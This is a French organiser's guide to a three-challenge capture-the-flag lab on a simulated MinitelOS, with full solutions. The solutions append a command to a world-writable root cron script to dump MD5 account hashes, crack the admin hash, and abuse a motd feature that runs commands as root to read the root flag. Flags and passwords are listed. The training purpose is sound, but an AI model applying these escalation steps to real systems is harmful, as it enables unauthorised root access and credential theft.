# MinitelOS CTF — Guide des Challenges

Créneau : **15 minutes** par équipe pour enchaîner les challenges.
Chaque challenge pivote vers le suivant — une seule session de jeu.

```
stagiaire/1234 ──[C1 cron]──► admin/minitel ──[C2 flag]──[C3 motd]──► FLAG root
```

---

## Prérequis

- [PlatformIO Core](https://docs.platformio.org/en/latest/core/installation/) (`pip install platformio`)
- Branche : `ctf/scenario-3-backdoor-cron`

```bash
git clone <repo>
cd MinitelOS
git checkout ctf/scenario-3-backdoor-cron
```

---

## Build & lancement

### Simulateur natif (poste organisateur / démo)

```bash
# Compiler
pio run -e native

# Lancer — CTF_MODE actif : reset complet au démarrage
.pio/build/native/program
```

### ESP32 (Minitel physique)

```bash
# Compiler et flasher le firmware
pio run -e MinitelOS -t upload

# Flasher le filesystem initial (première fois seulement)
pio run -e MinitelOS -t uploadfs

# Monitor série (debug)
pio device monitor
```

> Au boot, `CTF_MODE` recrée tous les fichiers CTF et supprime les artefacts des sessions précédentes.

---

## Reset entre équipes

### Simulateur

```bash
rm -rf sim_fs/ && .pio/build/native/program
```

### ESP32

```bash
# Simple reboot (bouton RESET sur la carte)
# CTF_MODE recrée tout au démarrage automatiquement
```

---

## Configuration

| Paramètre | Emplacement | Valeur par défaut |
|-----------|-------------|-------------------|
| Durée CTF | `sim_fs/root/.ctf_config` | `900` (15 min) |
| Intervalle cron | `sim_fs/root/.crontab` | `30` (secondes) |
| Activer CTF_MODE | `platformio.ini` → `build_flags` | `-D CTF_MODE` |

```bash
# Ajuster la durée (ex. 12 min)
echo "720" > sim_fs/root/.ctf_config

# Cron rapide pour démo (5s)
# Éditer sim_fs/root/.crontab : remplacer 30 par 5

# Désactiver CTF_MODE (build standard)
# Dans platformio.ini, retirer -D CTF_MODE des build_flags
```

---

## Challenge 1 — La Backdoor Cron *(pivot, pas de flag)*

**Difficulté** : ⭐⭐ Intermédiaire
**Durée recommandée** : 6 min
**Pivot** : stagiaire → **admin**

### Accès de départ

```
Login    : stagiaire
Password : 1234       (donné sur fiche)
```

### Objectif

Exploiter le cron world-writable pour dumper la base de comptes en root,
identifier le hash crackable et pivoter vers le compte admin.

### Chemin de résolution

```
1. ps
   → [2] 30s run /scripts/maintenance.msh  (root)

2. cat /scripts/maintenance.msh
   → Script légitime, world-writable

3. edit /scripts/maintenance.msh
   → Ajouter (touche 'a') :
        cat /root/.users > /tmp/loot.txt
   → Sauvegarder (w)

4. (attendre ~30 secondes)

5. cat /tmp/loot.txt
   → root:2260a49226afcd3bb784cb3e3888ea91:root       ← INCRACKABLE
   → stagiaire:81dc9bdb52d04dc20036dbd8313ed055:user  ← connu (1234)
   → admin:bb3c3e98175d33c8300fbb0e84bf9e9f:admin     ← À CRACKER

6. Craquer le hash MD5 de admin (wordlist ci-dessous)
   → "minitel"

7. su admin  →  password : minitel
```

### Indices papier (progressifs)

1. *"Un processus tourne en arrière-plan en tant que root..."*
2. *"Le script de maintenance est dans /scripts. Qui peut le modifier ?"*
3. *"Si le script tourne en root, il peut lire des fichiers protégés..."*

### Wordlist

```
minitel  password  admin  1234  telmini  root  azerty  qwerty
```

---

## Challenge 2 — Le Flag Admin

**Difficulté** : ⭐ Facile
**Durée recommandée** : 1 min
**Pivot** : — (fin du pivot C1)

### Accès de départ

Credentials obtenus à la fin de C1 (`su admin` / `minitel`).

### Objectif

Explorer le répertoire admin et lire le flag.

### Chemin de résolution

```
1. ls
   → flag2.txt  notes_perso.txt  README.txt

2. cat flag2.txt
   → FLAG{4dm1n_4cc3ss}
```

---

## Challenge 3 — L'Éditeur Piégé *(flag final)*

**Difficulté** : ⭐⭐⭐ Avancé
**Durée recommandée** : 8 min
**Pivot** : admin → **root** (exécution)

### Accès de départ

Toujours connecté en tant qu'admin (suite directe de C2).

### Objectif

Exploiter la fonctionnalité `motd` qui exécute les commandes en root
pour lire `/root/flag3.txt` — sans jamais connaître le mot de passe root.

### Chemin de résolution

```
1. cat README.txt
   → "Les commandes shell sont exécutées en tant que SYSTEME
      pour afficher des informations dynamiques"

2. edit motd_perso.txt
   → Écrire : cat /root/flag3.txt > /tmp/pwned.txt
   → Sauvegarder (w)

3. motd
   → Exécute motd_perso.txt EN ROOT (bug d'implémentation)

4. cat /tmp/pwned.txt
   → FLAG{r00t_m0td_pwn3d}
```

### Indices papier (progressifs)

1. *"Lisez attentivement votre répertoire personnel..."*
2. *"La commande motd exécute les commandes. Dans quel contexte ?"*
3. *"Une commande qui redirige vers /tmp peut créer un fichier lisible par tous."*

---

## Tableau récapitulatif

| # | Nature | Login départ | Flag | Durée |
|---|--------|-------------|------|-------|
| 1 | Pivot cron → admin | stagiaire / 1234 | *(pas de flag)* | ~6 min |
| 2 | Flag admin | admin / minitel | `FLAG{4dm1n_4cc3ss}` | ~1 min |
| 3 | Motd → root exec | admin / minitel | `FLAG{r00t_m0td_pwn3d}` | ~8 min |

---

## Arborescence sim_fs

```
sim_fs/
├── .motd                        # Bannière CTF
├── home/
│   ├── stagiaire/
│   │   └── note.txt             # Indice C1 : droits mal configurés sur /scripts/
│   └── admin/
│       ├── flag2.txt            # FLAG Challenge 2 (admin-only)
│       ├── notes_perso.txt      # Hint motd
│       └── README.txt           # Indice C3 : motd exécute en root
├── root/                        # Accessible root uniquement
│   ├── .users                   # Base de comptes MD5 (dumped via C1)
│   ├── .crontab                 # Tâche cron : 30s run /scripts/maintenance.msh
│   ├── .ctf_config              # Durée CTF (900 = 15 min)
│   ├── .fsmeta                  # Permissions fichiers
│   └── flag3.txt                # FLAG Challenge 3
├── scripts/                     # World-accessible
│   ├── maintenance.msh          # Script cron world-writable (vecteur C1)
│   └── maintenance.log          # Log d'exécution
└── tmp/                         # Sorties des injections
```

---

## Comptes utilisateurs

| User | Password | Level | Rôle |
|------|----------|-------|------|
| `stagiaire` | 1234 | user | Point d'entrée — donné sur fiche |
| `admin` | minitel | admin | Cracké via C1 (hash MD5 dans /tmp/loot.txt) |
| `root` | *aléatoire* | root | Incrackable — C3 bypasse le password |

---

## Notes organisateur

- **Reset entre équipes** : `rm -rf sim_fs/ && .pio/build/native/program` ou reboot ESP32
- **Ajuster le timer** : `sim_fs/root/.ctf_config` (secondes)
- **Cron démo rapide** : mettre `5` dans `sim_fs/root/.crontab` au lieu de `30`
- **Vérifier la progression** : `ctftime` affiche le temps restant
- **Artefacts nettoyés automatiquement par CTF_MODE au boot** :
  - `/tmp/loot.txt` — dump .users (C1)
  - `/tmp/pwned.txt` — flag root (C3)
  - `/home/admin/motd_perso.txt` — injection C3
